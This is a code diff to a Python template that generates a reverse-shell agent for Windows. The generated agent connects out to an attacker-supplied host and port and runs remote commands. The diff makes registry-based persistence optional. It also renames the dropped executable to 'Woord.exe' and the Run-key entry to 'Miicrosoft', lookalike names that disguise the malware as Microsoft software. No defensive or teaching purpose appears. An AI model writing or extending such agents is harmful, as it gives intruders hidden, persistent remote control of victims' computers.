@@ -1,5 +1,9 @@
 # templates/tcp_agent_template.py
-def tcp_agent_template(lhost, lport):
+def tcp_agent_template(lhost, lport, persistence):
+    if persistence==True:
+        val = "ensure_persistence()"
+    else:
+        val = ""
     return f"""import socket
 import subprocess
 import os
@@ -14,12 +18,12 @@ port = {lport}
 current_working_directory = os.getcwd()
 
 def ensure_persistence():
-    destination_executable = os.path.join(os.environ['USERPROFILE'], 'Documents', "clienthai.exe")
+    destination_executable = os.path.join(os.environ['USERPROFILE'], 'Documents', "Woord.exe")
     try:
         if not os.path.exists(destination_executable):
             shutil.copy(sys.executable, destination_executable)
             key = wreg.OpenKey(wreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Run", 0, wreg.KEY_SET_VALUE)
-            wreg.SetValueEx(key, "MyRochak", 0, wreg.REG_SZ, destination_executable)
+            wreg.SetValueEx(key, "Miicrosoft", 0, wreg.REG_SZ, destination_executable)
             wreg.CloseKey(key)
         #print("Persistence ensured.")
     except Exception as e:
@@ -149,7 +153,7 @@ def execute_other_commands(client_socket, msg_parts):
         client_socket.send(f"Command execution error: {{e}}".encode())
 
 if __name__ == "__main__":
-    ensure_persistence()
+    {val}
     cs = attempt_connection()
     cs.send(b'TEST CLIENT')
     process_commands(cs)
